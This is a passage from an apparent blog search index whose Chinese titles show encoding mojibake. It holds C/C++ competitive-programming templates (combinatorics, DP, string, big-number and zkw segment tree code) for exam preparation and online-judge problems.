","date":"2018-03-10","objectID":"/exam-prep/:12:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"ç»„åˆæ•°è®¡ç®— typedef long long ll; ll C[41][41]; void calc() { C[1][0] = C[1][1] = 1; for(int i = 2; i \u003c= 40; ++i) { C[i][0] = 1; for(int j = 1; j \u003c= i; ++j) C[i][j] = C[i-1][j] + C[i-1][j-1]; } } ","date":"2018-03-10","objectID":"/exam-prep/:13:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"LISï¼ˆnlognï¼‰ fill(f, f+n, INF); for (int i = 0; i \u003c n; ++i) *lower_bound(f, f+n, a[i]) = a[i]; printf(\"%d\\n\", lower_bound(f, f+n, INF) - f); ","date":"2018-03-10","objectID":"/exam-prep/:14:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"é—°å¹´åˆ¤æ–­ bool is_leap(int n) { return ((n % 4 == 0 \u0026\u0026 n % 100)|| n % 400 == 0) ? 1 : 0; } ","date":"2018-03-10","objectID":"/exam-prep/:15:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"è¾“å‡ºç»™å®šæ—¥æœŸæ˜¯æ˜ŸæœŸå‡  int main() { int y, m, d; scanf(\"%d-%d-%d\", \u0026y, \u0026m, \u0026d); if (m == 1 || m == 2){ --y; m += 12; } int c = y / 100; int yy = y - c * 100; int day = yy + yy / 4 + c / 4 - 2 * c + 13 * (m + 1) / 5 + d - 1; if (y \u003c= 1582 \u0026\u0026 m \u003c= 10 \u0026\u0026 d \u003c= 4) day += 3; while (day \u003c 0) day += 7; day %= 7; switch(day){ case 1: printf(\"Monday\\n\");break; case 2: printf(\"Tuesday\\n\");break; case 3: printf(\"Wednesday\\n\");break; case 4: printf(\"Thursday\\n\");break; case 5: printf(\"Friday\\n\");break; case 6: printf(\"Saturday\\n\");break; default: printf(\"Sunday\\n\"); } return 0; } ","date":"2018-03-10","objectID":"/exam-prep/:16:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"å·§ç®—æ•°å­¦é—®é¢˜ ","date":"2018-03-10","objectID":"/exam-prep/:17:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"n! é¦–ä½æ•° const double PI = 3.14159265358979; const double E = 2.718281828; int main() { int n,fn; double log_n_fac; while (scanf(\"%d\", \u0026n) != EOF){ log_n_fac = 0.5 * log10(2 * PI *(double)n) + (double)n * log10((double)n / E); log_n_fac -=(int)log_n_fac; fn = pow(10, log_n_fac);//Stirling's approximation switch(n){ case 0:printf(\"1\\n\");break; case 1:printf(\"1\\n\");break; case 2:printf(\"2\\n\");break; case 3:printf(\"6\\n\");break; case 7:printf(\"5\\n\");break; case 8:printf(\"4\\n\");break; default:printf(\"%d\\n\", fn); } } return 0; } ","date":"2018-03-10","objectID":"/exam-prep/:17:1","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"n^n é¦–ä½æ•° int main() { int n; scanf(\"%d\",\u0026n); while(n != 0){ printf(\"%d\\n\",(int)pow(10,n*log10(n)-(int)(n*log10(n)))); scanf(\"%d\",\u0026n); } return 0; } ","date":"2018-03-10","objectID":"/exam-prep/:17:2","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æ•´æ•°è´¨å› å­åˆ†è§£ int n; void solve() { int i; int m = n; for (i = 2; i \u003c= n; i++){ int cnt = 0; if (m % i) continue; while (m % i == 0){ m /= i; cnt++; } printf(\"(%d,%d)\", i, cnt); if (m == 1) break; } printf(\"\\n\"); } ","date":"2018-03-10","objectID":"/exam-prep/:17:3","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"n! å³ç«¯çš„ 0 çš„ä¸ªæ•° int main() { int t,i,n,m,z; scanf(\"%d\", \u0026t); for (i = 0; i \u003c t; i++){ scanf(\"%d\", \u0026n); m = 5;z = 0; while (n\u003e= m){ z += n / m; m *= 5; } printf(\"case #%d:\\n%d\\n\", i, z); } return 0; } ","date":"2018-03-10","objectID":"/exam-prep/:17:4","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æœ€é•¿å›æ–‡å­ä¸² // ä¸­å¿ƒæ‰©å±•æ³• string expand(string s, int c1, int c2) { int l = c1, r = c2; int n = s.size(); while (l\u003e= 0 \u0026\u0026 r \u003c= n-1 \u0026\u0026 s[l] == s[r]) l--, r++; return s.substr(l+1, r-l-1); } string lps(string s) { int n = s.size(); if (!n) return \"\"; string lungo = s.substr(0, 1); for (int i = 0; i \u003c n-1; i++) { string p1 = expand(s, i, i); if (p1.size() \u003e lungo.size()) lungo = p1; string p2 = expand(s, i, i+1); if (p2.size() \u003e lungo.size()) lungo = p2; } return lungo; } ","date":"2018-03-10","objectID":"/exam-prep/:18:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æœ€å¤§åŒºé—´å’Œ ans = a[0]; for (i = 0; i \u003c n; ++i){ if (tot\u003e 0) tot += a[i]; else tot = a[i]; ans = (tot\u003eans)?tot:ans; } ","date":"2018-03-10","objectID":"/exam-prep/:19:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"å°å‹åˆ†æ•°æ¨¡æ¿ struct frac { ll nume, deno; ll gcd(ll a, ll b) { a = abs(a); b = abs(b); return b ? gcd(b, a % b) : a; } void reduct() { if(!nume) { deno = 1; return; } ll g = gcd(nume, deno); nume /= g; deno /= g; return; } frac(ll a, ll b = 1) { nume = a; deno = b; (*this).reduct(); } void print() { if(deno == 1) printf(\"%lld\\n\", nume); else printf(\"%lld/%lld\\n\", nume, deno); } }; frac operator+(const frac\u0026 a, const frac\u0026 b) { frac ret(a.nume*b.deno + b.nume*a.deno, a.deno*b.deno); ret.reduct(); return ret; } ","date":"2018-03-10","objectID":"/exam-prep/:20:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"ç®€å• DP ","date":"2018-03-10","objectID":"/exam-prep/:21:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"01 èƒŒåŒ… for (i = 0; i \u003c n; ++i) for (j = m; j\u003e= w[i]; --j) dp[j] = max(dp[j], dp[j-w[i]] + c[i]); ","date":"2018-03-10","objectID":"/exam-prep/:21:1","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æœ€å¤§ä¸Šå‡å­åºåˆ—å’Œï¼ˆn^2ï¼‰ for (i = 0; i \u003c n; ++i) dp[i] = a[i]; nowmax = a[0]; for (i = 0; i \u003c n; ++i) for (int j = 0; j \u003c i; ++j) if (a[j] \u003ca[i]) { dp[i] = max(dp[i], dp[j] + a[i]); nowmax = max(nowmax, dp[i]); } ","date":"2018-03-10","objectID":"/exam-prep/:21:2","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æ•´æ•°æ‹†åˆ† for (i = 1; i \u003c= n; ++i) for (j = 2; j \u003c= n; ++j) { dp[i][j] = dp[i][j - 1]; if (i == j) ++dp[i][j]; else if(i\u003e j) dp[i][j] += dp[i - j][j]; } ","date":"2018-03-10","objectID":"/exam-prep/:21:3","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æ‹†æˆ 2 çš„å¹‚å’Œ for (int i = 3; i \u003c= 1000000; ++i) { if (i \u0026 1) dp[i] = dp[i-1] % mod; else dp[i] = (dp[i-2] + dp[i\u003e\u003e1]) % mod; } ","date":"2018-03-10","objectID":"/exam-prep/:21:4","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æ‹†æˆä¸é‡å¤æ­£æ•´æ•° dp[0] = 1; for (int i = 1; i \u003c= m; ++i) for (int j = n; j\u003e= i; --j) dp[j] += dp[j-i]; ","date":"2018-03-10","objectID":"/exam-prep/:21:5","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æ•°å¡”ï¼ˆæœ€å°å’Œï¼‰ for (i = 0; i \u003c n; ++i) for (j = 0; j \u003c= i; ++j) scanf(\"%d\", \u0026a[i][j]); for (i = n - 1; i\u003e= 0; --i) for (j = 0; j \u003c= i; ++j) dp[j] = min(dp[j], dp[j + 1]) + a[i][j]; printf(\"%d\\n\", dp[0]); ","date":"2018-03-10","objectID":"/exam-prep/:21:6","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æ•°å¡”ï¼ˆæœ€å¤§å’Œï¼‰ for (i = 1; i \u003c= n; ++i) for (j = 1; j \u003c= i; ++j){ scanf(\"%d\", \u0026a[i][j][0]); a[i][j][1] = a[i][j][0]; } for (j = 1; j \u003c= n; ++j) maxn[n] = max(maxn[n], a[n][j][0]); for (i = n-1; i\u003e= 1; --i) for (j = 1; j \u003c= i; ++j){ a[i][j][0] += max(a[i+1][j][0], a[i+1][j+1][0]); maxn[i] = max(maxn[i], a[i][j][0]); a[i][j][1] += max(max(a[i+1][j][1], a[i+1][j+1][1]), maxn[i+1]); } printf(\"%d\\n\", a[1][1][1]); ","date":"2018-03-10","objectID":"/exam-prep/:21:7","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"æ•°å¡”ï¼ˆä¸ªä½æ•°æœ€å¤§å’Œï¼‰ for (i = 0; i \u003c n; ++i) for (j = 0; j \u003c= i; ++j) scanf(\"%d\", \u0026a[i][j]); for (i = 0; i \u003c n; ++i) dp[n - 1][i][a[n - 1][i] % 10] = 1; for (i = n - 2; i\u003e= 0; --i) for (j = 0; j \u003c= i; ++j) for (k = 0; k \u003c 10; ++k) if (dp[i + 1][j][k] || dp[i + 1][j + 1][k]) dp[i][j][(k + a[i][j]) % 10] = 1; for (i = 9; i\u003e= 0; --i) if (dp[0][0][i]){printf(\"%d\\n\", i); break;} ","date":"2018-03-10","objectID":"/exam-prep/:21:8","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"è£…ç®±é—®é¢˜ï¼ˆDPï¼‰ for (i = 0; i \u003c n; ++i) { scanf(\"%d\", \u0026w); for (j = m; j\u003e= w; --j) dp[j] = max(dp[j], dp[j-w] + w); } ","date":"2018-03-10","objectID":"/exam-prep/:21:9","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"è£…ç®±é—®é¢˜ï¼ˆæœç´¢ï¼‰ void dfs(int cnt, int now) { if (now\u003e v) return; if (cnt == n + 1){ if (now\u003e max) max = now; return; } dfs(cnt + 1, now); dfs(cnt + 1, now + a[cnt]); } ","date":"2018-03-10","objectID":"/exam-prep/:21:10","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"åå…­è¿›åˆ¶åŠ æ³• const int N = 233; struct bigNum{ int a[N]; bigNum(){ memset(a,sizeof(a),0); for (int i=0;i\u003cN;i++)a[i] = 0; } void print(){ for (int i = a[0]; i\u003e0; i--){ printf(\"%X\",a[i]); } puts(\"\"); } bigNum operator + (const bigNum \u0026b){ bigNum c; c.a[0] = max(a[0], b.a[0]); int x = 0; for (int i=1;i\u003c=c.a[0];i++){ //printf(\"b[i] = %d\", b.a[i]); x += a[i] + b.a[i]; c.a[i] = x % 16; x /= 16; } if (x) c.a[++c.a[0]] = x; return c; } }a, b; int qd(char x){ if ('0' \u003c= x \u0026\u0026 x \u003c='9')return x -'0'; return x - 55; } bigNum jd(string st){ bigNum ans; ans.a[0] = st.length(); for (int i=1; i \u003c= ans.a[0]; i++){ ans.a[i] = qd(st[ans.a[0] - i]); } return ans; } int main(){ int T;scanf(\"%d\", \u0026T); string st1, st2; for (int cas = 0;cas \u003c T;cas++){ printf(\"case #%d:\\n\", cas); cin \u003e\u003e st1 \u003e\u003e st2; a = jd(st1); b = jd(st2); bigNum c = a + b; c.print(); } return 0; } ","date":"2018-03-10","objectID":"/exam-prep/:22:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"å…¶ä»– å¦å¤–æ”¾ä¸€äº› EOJ ä¸Šå…·æœ‰ä»£è¡¨æ€§çš„é¢˜ï¼Œé‡åˆ°ç±»ä¼¼çš„ç›´æ¥çœ‹æäº¤è®°å½•å°±å¯ä»¥äº†ï¼š åŒºé—´ç­›æ³•â€”â€”49 åŸƒæ°ç­›å› å­â€”â€”3469 è°¦è™šæ•° / ä¸‘æ•°ç±»ä¼¼â€”â€”1277 æŸ¥å•è¯â€”â€”3018 å¤šé¡¹å¼å¤„ç†â€”â€”2ï¼Œ2845 KMPâ€”â€”3441 ä¹±æè¾“å‡ºå›¾å½¢â€”â€”2983 çº¦ç‘Ÿå¤«â€”â€”1849ï¼Œ1982ï¼Œ3030 åˆ†æ•°ç›¸å…³â€”â€”3041ï¼Œ2980ï¼Œ2972 åŸºç¡€çš„å¤§æ³•å¸ˆï¼ˆé›¾ï¼‰/ å‰ªæ / å‰ç¼€å’Œç­‰ç­‰â€”â€”3490 å†…å­˜ç›¸å…³â€”â€”2822 floodfillâ€”â€”2848 ","date":"2018-03-10","objectID":"/exam-prep/:23:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"éƒ¨åˆ†åº“å‡½æ•° int isgraph(int ch) // æ˜¯å¦æ˜¯å¯æ‰“å°å­—ç¬¦ (ä¸å«ç©ºæ ¼) int isprint(int ch) // æ˜¯å¦æ˜¯å¯æ‰“å°å­—ç¬¦ (å«ç©ºæ ¼) int ispunct(int ch) double atan2(double y, double x) // y/x çš„åæ­£åˆ‡ (å¼§åº¦) int atoi(char *nptr) double strtod(char *str) int sscanf(char str, char *format) // é€šè¿‡ str æ ¼å¼åŒ–èµ‹å€¼ char strcpy(char* dest, char* src) char strcat(char* dest, char* src) char strchr(const char *s1, int c) int strcmp(const char* s1, const char* s2) // è¿”å› s1-s2 int strncmp(const char* s1, const char* s2, size_t maxlen) char strrev(char *s) char strstr(const char* s1, const char* s2) // s2 ä¸­ç¬¬ä¸€æ¬¡å‡ºç° s1 çš„ä½ç½® string s(cstr[, chars_len]); string s(num, c); string s(â€œabcdâ€); s.compare(â€œabcdâ€); // 0 s.compare(â€œdcbaâ€); // \u003c 0 s.compare(â€œabâ€); // \u003e 0 s.compare(0,2,s,2,2); // æ¯”è¾ƒ ab å’Œ cd \u003c 0 s.assign(â€œnicoâ€,5); // 'n','i','c','o','\\0' s.insert(1,str); // æ’å…¥åˆ°ç´¢å¼•å‰ s.replace(1,2,â€nternationalizatioâ€); // ä» 1 å¼€å§‹çš„ 2 ä¸ª s.erase(13); // ä» 13 å¼€å§‹å¾€åå…¨åˆ é™¤ s.erase(7,5); // ä» 7 å¼€å§‹å¾€ååˆ  5 ä¸ª string::find ç³»åˆ—ï¼š 1. æœç´¢å¯¹è±¡ 2. [èµ·ç‚¹ç´¢å¼•] 3. [æœç´¢å­—ç¬¦ä¸ªæ•°] ","date":"2018-03-10","objectID":"/exam-prep/:24:0","tags":["C/C++","æ•°å­¦","é«˜ç²¾åº¦","å¿«é€Ÿå¹‚","å­—ç¬¦ä¸²","åŠ¨æ€è§„åˆ’","æœç´¢","æœ€å¤§åŒºé—´å’Œ","æ¨¡ç‰ˆ"],"title":"ç¨‹åºè®¾è®¡èƒ½åŠ›å®è®­ èµ„æ–™å‡†å¤‡","uri":"/exam-prep/"},{"categories":["ç®—æ³•"],"content":"%ã€‚ å…³äº zkw çº¿æ®µæ ‘æ˜¯å•¥ï¼Œå‚è§ä»–æœ¬äººçš„ PPTï¼šç»Ÿè®¡çš„åŠ›é‡ ç›¸æ¯”é€’å½’ç‰ˆçº¿æ®µæ ‘ï¼š ä¼˜ç‚¹ï¼šä»£ç é‡è¾ƒå°‘ã€ç©ºé—´éœ€æ±‚ç•¥å°‘ï¼ˆå®é™…ä¸Šä¸éœ€è¦ 4 å€ï¼‰ã€è¿è¡Œæ•ˆç‡è¾ƒé«˜ï¼ˆéé€’å½’ï¼‰ ç¼ºç‚¹ï¼šåº”ç”¨èŒƒå›´æœ‰é™åˆ¶ã€‚å°½ç®¡å¯ä»¥ç¨åŠ ä¿®æ”¹å°±æ”¯æŒå•ç‚¹æ›´æ–° / å•ç‚¹æŸ¥è¯¢ / åŒºé—´æ›´æ–° / åŒºé—´æ±‚å’Œ / åŒºé—´ RMQ ç­‰ï¼Œä½†å…¶ä¸­éƒ¨åˆ†åŠŸèƒ½ä¼¼ä¹ä¸èƒ½åŒæ—¶å®ç° æ€»ä½“æ¥è¯´ï¼Œæ— è®ºæ˜¯ä»£ç é‡è¿˜æ˜¯åº”ç”¨èŒƒå›´éƒ½ä»‹äºæ ‘çŠ¶æ•°ç»„å’Œé€’å½’ç‰ˆçº¿æ®µæ ‘ä¹‹é—´ã€‚ å…³äºè¿™ä¸ªæ•°æ®ç»“æ„è¿˜åœ¨æ‘¸ç´¢â€¦â€¦ä¸‹é¢æ˜¯ä¸¤ä¸ªæ —å­: ","date":"2018-03-08","objectID":"/zkw-tree/:0:0","tags":["çº¿æ®µæ ‘","æ¨¡ç‰ˆ"],"title":"zkw çº¿æ®µæ ‘","uri":"/zkw-tree/"},{"categories":["ç®—æ³•"],"content":"HDU 1166 æ•Œå…µå¸ƒé˜µ https://cn.vjudge.net/problem/HDU-116 #include \u003ciostream\u003e#include \u003ccstdio\u003e#include \u003ccstring\u003eusing namespace std; const int maxn = 5e5+5; int T[maxn\u003c\u003c2], n, M; inline void pushup(int x) { T[x] = T[x\u003c\u003c1] + T[x\u003c\u003c1|1]; } inline void build() { for (M = 1; M \u003c= n+1; M \u003c\u003c= 1); for (int i = M+1; i \u003c= M+n; ++i) scanf(\"%d\", T+i); for (int i = M-1; i; --i) pushup(i); } inline void add(int x, int y) { for (T[x+=M] += y, x\u003e\u003e=1; x; x\u003e\u003e=1) pushup(x); } inline void sub(int x, int y) { for (T[x+=M] -= y, x\u003e\u003e=1; x; x\u003e\u003e=1) pushup(x); } inline int query(int s, int t) { int ans = 0; for (s += M-1, t += M+1; s^t^1; s\u003e\u003e=1, t\u003e\u003e=1) { if (~s\u00261) ans += T[s^1]; if (t\u00261) ans += T[t^1]; } return ans; } int main() { int t, a, b, k = 0; char op[10]; cin \u003e\u003e t; while (t--) { printf(\"Case %d:\\n\", ++k); memset(T, 0, sizeof T); scanf(\"%d\", \u0026n); build(); while (~scanf(\"%s\", op) \u0026\u0026 strcmp(op,\"End\")) { if (!strcmp(op,\"Query\")) {scanf(\"%d%d\", \u0026a, \u0026b); printf(\"%d\\n\", query(a,b));} else if (!strcmp(op,\"Add\")) {scanf(\"%d%d\", \u0026a, \u0026b); add(a,b);} else {scanf(\"%d%d\", \u0026a, \u0026b); sub(a,b);} } } return 0; } ","date":"2018-03-08","objectID":"/zkw-tree/:1:0","tags":["çº¿æ®µæ ‘","æ¨¡ç‰ˆ"],"title":"zkw çº¿æ®µæ ‘","uri":"/zkw-tree/"},{"categories":["ç®—æ³•"],"content":"EOJ 3389 çº¿æ®µæ ‘ï¼šç‚¹å¢åŠ  http://acm.ecnu.edu.cn/problem/3389/ å¾®å‘çš„æ¨¡æ¿é¢˜ã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; #define pushup(x) T[x]=T[x\u003c\u003c1]+T[x\u003c\u003c1|1] const int maxn = 500005; int n, m, M; long long T[maxn\u003c\u003c4]; inline void build() { for (M = 1; M \u003c= n+1; M \u003c\u003c= 1); for (int i = M+1; i \u003c= M+n; ++i) scanf(\"%lld\", T+i); for (int i = M-1; i; --i) pushup(i); } inline void update(int x, int y) { for (T[x+=M] += y, x\u003e\u003e=1; x; x\u003e\u003e=1) pushup(x); } inline void query(int s, int t) { long long ans = 0; for (s += M-1, t += M+1; s^t^1; s\u003e\u003e=1, t\u003e\u003e=1) { if (~s\u00261) ans += T[s^1]; if (t\u00261) ans += T[t^1]; } printf(\"%lld\\n\", ans); } int main() { int op, x, y; scanf(\"%d\", \u0026n); build(); scanf(\"%d\", \u0026m); while (m--) { scanf(\"%d%d%d\", \u0026op, \u0026x, \u0026y); (op == 1) ? update(x, y) : query(x, y); } return 0; } ","date":"2018-03-08","objectID":"/zkw-tree/:2:0","tags":["çº¿æ®µæ ‘","æ¨¡ç‰ˆ"],"title":"zkw çº¿æ®µæ ‘","uri":"/zkw-tree/"},{"categories":["ç®—æ³•"],"content":"è®°å½•äº†æ–°ç”Ÿè®­ç»ƒä¸Šé‡åˆ°çš„ä¸€äº›å¥‡æ€ªé¢˜ï¼Œä¸»è¦æ˜¯ Week2 é‡åˆ°çš„ã€‚ ","date":"2018-02-13","objectID":"/eoj-training/:0:0","tags":["æ•°å­¦","å¿«é€Ÿå¹‚","æœç´¢","Hash"],"title":"EOJ æ–°ç”Ÿè®­ç»ƒ","uri":"/eoj-training/"},{"categories":["ç®—æ³•"],"content":"Week 2 